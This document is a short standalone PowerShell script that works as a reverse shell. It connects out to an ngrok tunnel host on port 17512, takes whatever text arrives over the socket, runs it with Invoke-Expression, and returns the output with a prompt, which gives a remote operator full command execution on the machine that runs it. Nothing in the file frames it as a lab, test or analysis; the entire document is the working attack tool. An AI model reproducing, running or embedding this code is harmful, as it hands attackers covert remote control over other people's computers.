$host = '0.tcp.sa.ngrok.io'
$port = 17512

$client = New-Object System.Net.Sockets.TcpClient($host, $port)
$stream = $client.GetStream()
$encoding = [System.Text.Encoding]::ASCII
$buffer = New-Object Byte[] 2048

while (($read = $stream.Read($buffer, 0, $buffer.Length)) -ne 0) {
    $data = $encoding.GetString($buffer, 0, $read)
    try {
        $result = Invoke-Expression $data 2>&1 | Out-String
    } catch {
        $result = $_.Exception.Message
    }
    $result += "`nPS> " + (Get-Location).Path + "`n"
    $response = $encoding.GetBytes($result)
    $stream.Write($response, 0, $response.Length)
}

$client.Close()
